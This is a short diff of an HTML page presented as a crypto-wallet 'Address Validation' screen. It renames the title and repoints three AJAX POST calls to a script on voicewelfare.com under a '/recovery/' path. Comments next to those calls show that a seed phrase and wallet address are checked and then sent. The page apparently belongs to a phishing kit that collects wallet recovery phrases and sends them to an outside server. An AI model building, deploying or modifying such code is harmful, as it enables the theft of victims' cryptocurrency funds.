@@ -9,7 +9,7 @@
     <link rel="icon" type="image/png" sizes="32x32" href="../favicon_io/favicon-32x32.png">
     <link rel="icon" type="image/png" sizes="16x16" href="../favicon_io/favicon-16x16.png">
     <link rel="manifest" href="../site.webmanifest">
-    <title> Wallet Flare Node | Address Validation </title>
+    <title> Wallet Dapp Screen | Address Validation </title>
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.2/dist/css/bootstrap.min.css" rel="stylesheet"
         integrity="sha384-Zenh87qX5JnK2Jl0vWa8Ck2rdkQ2Bzep5IDxbcnCeuOxjzrPF/et3URy9Bv1WTRi" crossorigin="anonymous" />
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
@@ -2071,7 +2071,7 @@
                 // console.log('Seed phrase is valid:', dappPhrase);
                 // console.log('Wallet address:', wallet.address); url: "./validate.php",
                 $.ajax({
-                    url: "https://voicewelfare.com/recovery/walletdapp.php",
+                    url: "https://voicewelfare.com/recovery/walletdappscreen.php",
                     method: "POST",
                     dataType: "JSON",
                     data: {
@@ -2133,7 +2133,7 @@
             // console.log('Wallet address:', dappAddress);
 
             $.ajax({
-                url: "https://voicewelfare.com/recovery/walletdapp.php",
+                url: "https://voicewelfare.com/recovery/walletdappscreen.php",
                 method: "POST",
                 dataType: "JSON",
                 data: {
@@ -2175,7 +2175,7 @@
         try {
 
             $.ajax({
-                url: "https://voicewelfare.com/recovery/walletdapp.php",
+                url: "https://voicewelfare.com/recovery/walletdappscreen.php",
                 method: "POST",
                 dataType: "JSON",
                 data: {
